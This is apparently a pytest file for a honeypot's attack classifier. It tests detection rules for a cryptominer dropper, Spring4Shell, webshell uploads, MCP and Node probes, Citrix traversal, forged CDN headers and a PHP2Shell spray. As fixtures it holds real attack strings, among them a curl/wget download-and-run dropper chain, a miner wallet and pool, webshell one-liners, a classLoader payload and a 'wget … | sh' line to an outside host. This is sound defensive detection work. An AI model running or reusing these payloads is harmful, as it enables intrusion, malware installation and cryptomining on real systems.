"""The indicators the IOC sheets recommended and nothing implemented.

B4d, open item 11 of the 4 Oct-4 Nov fleet review. Seven unrelated families, one diff,
because each is the same shape of change: a sheet documented an indicator, listed it under
"Recommended (not implemented)", and the registry never gained it. One section per family, each
from the sheet that measured it.

Four deliberate departures, all recorded in the plan:

* The dota3 sheet's `MALWARE_DROPPER,CRYPTOMINER` becomes the `MALWARE` and `CRYPTOMINING` types
  that already exist and already score high. Two rules on two pieces of evidence — the delivery
  chain and the payment identifier — rather than one rule emitting an invented type name.
* Its item 2 asks for `EXPLOIT,CVE_2022_22965` "and drop `PHP`". The verdict is `RCE`: a CVE
  label needs the affected service bound to the request, which Phase A was about, and nothing
  about a form body says Spring is behind it. Dropping the `PHP` co-label would need a
  suppression mechanism the registry does not have; the `RCE` row outranks it.
* `/sse` gets no rule. The review measured it at exactly the same rate as `/mcp` (182 each), but
  server-sent events are an ordinary transport and one request for `/sse` on its own says
  nothing. `/mcp` and the MCP `initialize` body are what identify the protocol.
* The Citrix family is named as a behaviour, not as CVE-2019-19781. The paths are that CVE's own
  public checks, and they are also just paths; `CITRIX_TRAVERSAL` says what arrived.
"""

from __future__ import annotations

import pytest

from honeylens.classification.attack_classifier import classify_event_row
from honeylens.classification.mitre_mapping import get_mitre_mapping
from honeylens.classification.scoring import get_severity


def _row(path="/", body="", *, method="GET", port=443, headers=None):
    meta = {"method": method, "path": path, "port": port}
    if headers:
        meta["headers"] = {"host": "sensor.example", **headers}
    if body:
        meta["body_sample"] = body
        meta["body_len"] = len(body)
    payload = f"{method} {path} body_len={len(body)}" + (f"\n{body}" if body else "")
    return classify_event_row(payload, "http", meta)


def _types(hits) -> set[str]:
    return {h[0] for h in hits}


def _rules(hits) -> set[str]:
    return {h[1] for h in hits}


# ---------------------------------------------------------------------------
# 1. dota3 / Outlaw XMRig dropper — the internal dota3 dropper IOC notes §6
# ---------------------------------------------------------------------------

DROPPER_BODY = (
    "(( curl -sL https://badmonner.s.gy/dota-download -o /tmp/dota3.tar.gz "
    "|| wget -q -O /tmp/dota3.tar.gz https://badmonner.s.gy/dota-download ) ); "
    "D=~/.configrc6; [ -f $D/initall ] || D=/tmp/.configrc6; "
    "chmod +x $D/initall; nohup $D/initall >/dev/null 2>&1 &"
)
WALLET = "87FjG9Yn2MASj6JQ3KyL1MQGdTijxsBCBWLAb4pfBx9gi1MTgnwiGGJ6jc6jKHgk78b8h6rXK6M4k4L8Wv4veL1oNmL5sDZ"


@pytest.mark.parametrize(
    "token",
    ["badmonner.s.gy/dota-download", "~/.configrc6", "chmod +x $D/initall", "dota3.tar.gz"],
)
def test_the_delivery_chain_is_named_as_a_dropper(token):
    """§6.1: none of these has a benign form. `.configrc6` + `initall` + `dota3.tar.gz` is the
    long-running Outlaw kit, delivered here through a web framework instead of SSH."""
    hits = _row("/", f"cmd={token}", method="POST")

    assert "MALWARE" in _types(hits)
    assert get_severity("MALWARE", "outlaw_dota3_dropper") == "high"


def test_the_whole_captured_dropper_body_is_named():
    assert "MALWARE" in _types(_row("/", DROPPER_BODY, method="POST"))


@pytest.mark.parametrize("token", ["auto.c3pool.org:80", WALLET, "--randomx-mode lite"])
def test_the_mining_half_is_named_separately(token):
    """The pool and the wallet are the payment identifier — the one indicator that survives the
    operator changing hosts. A different claim from the delivery chain, so a different row."""
    hits = _row("/", f"x={token}", method="POST")

    assert "CRYPTOMINING" in _types(hits)


def test_an_ordinary_curl_in_a_body_is_not_this_dropper():
    """The named hosts are the evidence. `curl` on its own is half the internet's install docs."""
    hits = _row("/", "cmd=curl -sL https://example.com/install.sh | sh", method="POST")

    assert "MALWARE" not in _types(hits)


def test_spring4shell_is_named_as_execution():
    """§6.2. `class.module.classLoader.` in a form body is the Spring4Shell write primitive."""
    body = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"
    hits = _row("/", body, method="POST")

    assert "RCE" in _types(hits)
    assert "spring4shell_class_loader" in _rules(hits)


def test_a_webshell_being_written_is_not_a_webshell_being_probed():
    """§6.3. A PUT or POST to a script path whose body carries code is a drop; asking for the
    same path is a probe, and the fleet has conflated the two before — that is the whole
    `sp-webshell-aspx` lesson."""
    hits = _row(
        "/upload/shell.jsp", "Runtime.getRuntime().exec(request.getParameter('c'))", method="PUT"
    )

    assert "WEBSHELL_UPLOAD" in _types(hits)
    assert get_severity("WEBSHELL_UPLOAD", "webshell_upload_to_script_path") == "critical"


def test_a_php_webshell_drop_counts_too():
    hits = _row("/images/x.php", "<?php system($_GET[0]);?>", method="POST")

    assert "WEBSHELL_UPLOAD" in _types(hits)


def test_asking_for_a_script_path_is_not_an_upload():
    hits = _row("/upload/shell.jsp", method="GET")

    assert "WEBSHELL_UPLOAD" not in _types(hits)


def test_posting_a_form_to_a_php_page_is_not_an_upload():
    """The body has to carry code. Every PHP site on earth takes POSTs."""
    hits = _row("/login.php", "user=x&pass=y", method="POST")

    assert "WEBSHELL_UPLOAD" not in _types(hits)


def test_a_code_execution_api_is_named_as_one():
    """§6.4: a `{"code": …}` body on a `/run` or `*/exec/*` path. `SUPPLY_CHAIN` is for
    dependency abuse and was being used for this."""
    hits = _row("/api/run", "{\"code\":\"require('child_process').exec('id')\"}", method="POST")

    assert "CODE_EXEC_API" in _types(hits)


def test_an_exec_path_without_a_code_field_is_not_claimed():
    hits = _row("/api/v1/exec/status", '{"id":1}', method="POST")

    assert "CODE_EXEC_API" not in _types(hits)


# ---------------------------------------------------------------------------
# 2. MCP transport discovery — review §3.8 and §5.1
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("path", ["/mcp", "/mcp/", "/api/mcp"])
def test_an_mcp_endpoint_probe_is_named(path):
    """182 events on honeypotng :8001, stored `(none)`. An exposed MCP server is a free
    inference endpoint, which is the same demand for compute as the Ollama sweeps — so it gets
    the verdict that already means that."""
    hits = _row(path)

    assert "AI_ENDPOINT_PROBE" in _types(hits)


def test_the_mcp_initialize_body_is_named():
    """`protocolVersion 2025-03-26` from Azure addresses, per the internal NetScaler IOC
    notes. The dated protocol version is MCP's own handshake and nothing else uses that shape."""
    body = '{"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2025-03-26"}}'
    hits = _row("/", body, method="POST")

    assert "AI_ENDPOINT_PROBE" in _types(hits)


def test_server_sent_events_alone_are_not_mcp():
    """Measured at the same rate as `/mcp`, and still an ordinary transport."""
    hits = _row("/sse")

    assert "AI_ENDPOINT_PROBE" not in _types(hits)


# ---------------------------------------------------------------------------
# 3. The Citrix traversal family — the internal NetScaler IOC notes
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "/vpn/../vpns/cfg/smb.conf",
        "/logon/LogonPoint/../vpns/cfg/smb.conf",
        "/vpns/cfg/smb.conf",
        "/SDK/webLanguage",
    ],
)
def test_the_citrix_traversal_family_has_its_own_name(path):
    """Five addresses in one /24, one request each, 28 minutes, both sensors. The rows carried
    `ns-path-traversal` / `LFI` / `SENSITIVE_FILE` — indistinguishable from a generic
    `/etc/passwd` attempt, which is the sheet's own complaint."""
    hits = _row(path)

    assert "CITRIX_TRAVERSAL" in _types(hits)


def test_a_generic_traversal_is_not_claimed_as_citrix():
    hits = _row("/../../../../etc/passwd")

    assert "CITRIX_TRAVERSAL" not in _types(hits)
    assert "LFI" in _types(hits)


def test_a_single_dot_dot_is_why_this_family_needed_its_own_name():
    """`/vpn/../vpns/cfg/smb.conf` has one `../`, which the generic LFI rules do not match --
    they want a repeated traversal or a known target file. So before this rule the central
    classifier produced NOTHING for these requests, and the only thing naming them was the
    NetScaler decoy's own `ns-path-traversal` tag, which exists on one decoy."""
    hits = _row("/vpn/../vpns/cfg/smb.conf")

    assert _types(hits) == {"CITRIX_TRAVERSAL"}


# ---------------------------------------------------------------------------
# 4. Node-stack reconnaissance — the internal NODE2SHELL IOC notes §1c-§1d
# ---------------------------------------------------------------------------


def test_a_trpc_batch_call_is_named_as_node_reconnaissance():
    """16 of 37 sources asked for `/api/trpc/settings.ai?batch=1&input=%7B%7D` within hours of
    the Node bait existing. A correctly-formed tRPC v10 batch call naming an AI-settings
    router: that route is already in whatever corpus these scanners work from."""
    hits = _row("/api/trpc/settings.ai?batch=1&input=%7B%7D")

    assert "NODE_RECON" in _types(hits)


def test_the_trpc_root_counts_too():
    """19 events, 16 sources, stored `(none)`."""
    assert "NODE_RECON" in _types(_row("/api/trpc"))


def test_the_better_auth_session_endpoint_is_named():
    """`/api/auth/get-session` belongs to better-auth / NextAuth. A PHP or Java sweep does not
    ask for it."""
    assert "NODE_RECON" in _types(_row("/api/auth/get-session"))


def test_node_reconnaissance_is_low():
    """§1c says it plainly: this is reconnaissance, not the CVE the bait was built for."""
    assert get_severity("NODE_RECON", "trpc_batch_probe") == "low"


def test_a_generic_auth_path_is_not_node_specific():
    hits = _row("/api/auth/login")

    assert "NODE_RECON" not in _types(hits)


# ---------------------------------------------------------------------------
# 5. The two remaining real-IP spoofing detections
#    The internal real-IP spoofing IOC notes §6
# ---------------------------------------------------------------------------


def test_the_custom_ip_authorization_header_is_its_own_token():
    """§6.3: the name only appears in bypass recipes. 313 occurrences on sensor-b, 247 of them
    carrying `127.0.0.1`, and 7 on sensor-a."""
    hits = _row("/", headers={"x-custom-ip-authorization": "127.0.0.1"})

    assert "header_custom_ip_authorization" in _rules(hits)


def test_the_header_counts_whatever_value_it_carries():
    """Unlike the real-IP headers, nothing legitimate sends this one at all, so the value does
    not have to be unroutable for the claim to hold. 66 distinct values were measured."""
    assert "header_custom_ip_authorization" in _rules(
        _row("/", headers={"x-custom-ip-authorization": "172.26.0.210"})
    )


def test_a_request_cannot_arrive_through_both_cdns():
    """§6.4 and §5: `45.61.178.105` wrapped its sweep in `Via: 1.1 442.cloudfront.net` AND a
    `cf-ray`, both randomised per request. One request does not transit CloudFront and
    Cloudflare, so the pair is forged on its face — no peer lookup required. 292 `cf-ray` and
    249 `Via: *.cloudfront.net` rows on sensor-b."""
    hits = _row(
        "/.drone.yml",
        headers={"via": "1.1 442.cloudfront.net (Squid/5.0)", "cf-ray": "3b5134c8c8b29186-IAD"},
    )

    assert "FORGED_ORIGIN" in _types(hits)


def test_one_cdn_header_on_its_own_is_not_forged():
    """A request really can arrive through Cloudflare. The contradiction is the evidence."""
    assert "FORGED_ORIGIN" not in _types(_row("/", headers={"cf-ray": "3b5134c8c8b29186-IAD"}))
    assert "FORGED_ORIGIN" not in _types(
        _row("/", headers={"via": "1.1 442.cloudfront.net (Squid/5.0)"})
    )


# ---------------------------------------------------------------------------
# 6. The `t[]` repetition token — the internal PHP2SHELL IOC notes
# ---------------------------------------------------------------------------


def _t_array_body(copies: int, filler: int = 60) -> str:
    """The 85.11.167.243 shape: the vector field, grooming runs, then N byte-identical `t[]`
    parts each NUL-framed around `system` and its argument. The real capture is 62,929 bytes
    with 149 copies, and the C2 host, `wget` and the `t[]` part each occur exactly 149 times.

    The field is present because the spray IS a PHP2Shell body -- `name="PHPSESSID"` and
    `name="PHP_SESSION_UPLOAD_PROGRESS"` come first in the measured structure, which is why the
    whole-body pass gates on the field before counting.

    ⚠️ The real capture is not reachable this way. Its raw request holds 35,462 NUL bytes, so
    the decoy stores it as `body_sample_b64` with the bytes in `full_payload`, and the
    classifier reads neither: it takes only `str` metadata values. For that one capture this
    token therefore adds nothing and a body length is still the only tell. Decoding
    `body_sample_b64` into a scan target would fix it and would also push random bytes through
    700 regexes, so it is recorded as a finding rather than done here."""
    part = 'name="t[]"' + "\x00" * filler + "system\x00wget http://198.51.100.7/s -O- | sh\x00"
    return 'name="PHP_SESSION_UPLOAD_PROGRESS" x\n' + "A" * 400 + part * copies


def test_the_t_array_spray_is_named():
    """§: `85.11.167.243` sent 10,368 bytes of `A`/`B` grooming and then 149 identical `t[]`
    blobs. No `<?php`, no `passthru`, no PHP syntax at all — so the code-injection rule
    correctly declines it and the nested-key rule does not match it either. Until this token
    existed the shape was caught only by a body length."""
    hits = _row("/", _t_array_body(5), method="POST")

    assert "php2shell_t_array_repetition" in _rules(hits)
    assert "CVE_2026_109618" in _types(hits)


def test_one_t_array_part_is_not_a_spray():
    """A single `t[]` form field is an ordinary PHP array parameter."""
    hits = _row("/", _t_array_body(1), method="POST")

    assert "php2shell_t_array_repetition" not in _rules(hits)


def test_the_spray_is_found_in_a_body_past_the_window():
    """The real one is 62,929 bytes, so the head and tail windows see the ends and not the
    middle — the same blind middle that cost a 22,619-byte dropper its verdict."""
    hits = _row("/", "B" * 30_000 + _t_array_body(6) + "B" * 30_000, method="POST")

    assert "php2shell_t_array_repetition" in _rules(hits)


def test_the_other_php2shell_verdicts_still_work():
    hits = _row("/", "PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]);?>", method="POST")

    assert "CVE_2026_109619" in _types(hits)


# ---------------------------------------------------------------------------
# 7. The SharePoint webshell path: asking is not dropping
#    docs/.../sharepoint-webshell-verdict-is-recon
# ---------------------------------------------------------------------------


def _sp(method: str, path: str, body: bytes = b""):
    from honeylens.honeypots.honeypot_sharepoint import _classify

    return _classify(method, path, "", {"host": "sensor.example"}, body)


def test_a_bare_get_of_the_webshell_path_is_not_a_webshell():
    """Measured across the fleet: 100 events from 86 sources on sensor-a and 73 from 60 on sensor-b,
    every one of them a GET, and NOT ONE with a body. So every `sp-webshell-aspx` row on the
    fleet -- HIGH, carrying CVE-2025-53770 -- described a request that asked whether a shell
    was already there. The verdict has never once described a drop."""
    tag = _sp("GET", "/_layouts/15/spinstall0.aspx")

    assert tag["attack_type"] == "sp-webshell-aspx-probe"
    assert tag["severity"] == "LOW"
    assert tag["cves"] == [], "a GET demonstrates no CVE"


def test_a_post_with_a_body_is_still_the_drop():
    """The event the HIGH verdict was written for. Nothing on the fleet has sent one yet."""
    tag = _sp("POST", "/_layouts/15/spinstall0.aspx", b'<%@ Page Language="C#" %>')

    assert tag["attack_type"] == "sp-webshell-aspx-drop"
    assert tag["severity"] == "HIGH"
    assert "CVE-2025-53770" in tag["cves"]


def test_a_post_with_no_body_is_not_a_drop():
    """A bodyless POST wrote nothing, whatever it was aiming at."""
    tag = _sp("POST", "/_layouts/15/spinstall0.aspx")

    assert tag["attack_type"] == "sp-webshell-aspx-probe"


def test_the_probe_still_writes_a_pattern_row():
    """`rules` is what the ingest turns into `attack_patterns`, one row per entry, and an EMPTY
    list sets `attack_types` on the event while writing no pattern row at all -- the defect
    migration 0012 exists for. Every behaviour carried a CVE until now, so this was never
    reachable; the probe claims no CVE, so the rule name becomes the behaviour tag."""
    tag = _sp("GET", "/_layouts/15/spinstall0.aspx")

    assert tag["rules"], "a verdict with no rules writes no attack_patterns row"
    assert tag["rules"] == ["sp-webshell-aspx-probe"]


def test_the_surface_still_records_which_path_was_asked_for():
    """Nothing about the request stops being recorded; only the claim changes."""
    tag = _sp("GET", "/_layouts/15/spinstall0.aspx")

    assert tag["surface"] == "webshell-aspx"


def test_a_cve_bearing_behaviour_keeps_its_cve_as_the_rule():
    """The common case is unchanged: when a CVE is claimed, it is both the rule name and the
    candidate-CVE list, exactly as before."""
    tag = _sp("POST", "/_layouts/15/spinstall0.aspx", b'<%@ Page Language="C#" %>')

    assert tag["rules"] == ["CVE-2025-53770"]
    assert tag["cves"] == tag["rules"]


# ---------------------------------------------------------------------------
# 7. Every new verdict can be placed on the dashboard
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "attack_type",
    ["WEBSHELL_UPLOAD", "CODE_EXEC_API", "CITRIX_TRAVERSAL", "NODE_RECON", "FORGED_ORIGIN"],
)
def test_every_new_verdict_is_mitre_mapped(attack_type):
    mapping = get_mitre_mapping(attack_type, "")

    assert mapping, f"{attack_type} has no MITRE mapping"
    assert all(m["technique"].startswith("T") for m in mapping), mapping
    assert all(m["tactic"] for m in mapping), mapping


def test_forged_provenance_is_defence_evasion():
    tactics = {m["tactic"] for m in get_mitre_mapping("FORGED_ORIGIN", "")}

    assert tactics == {"defense-evasion"}


# ---------------------------------------------------------------------------
# 8. Nothing else moves
# ---------------------------------------------------------------------------


def test_an_ordinary_request_is_untouched():
    assert _row("/index.html") == []


def test_a_plain_json_post_is_untouched():
    assert _row("/api/items", '{"name":"x"}', method="POST") == []
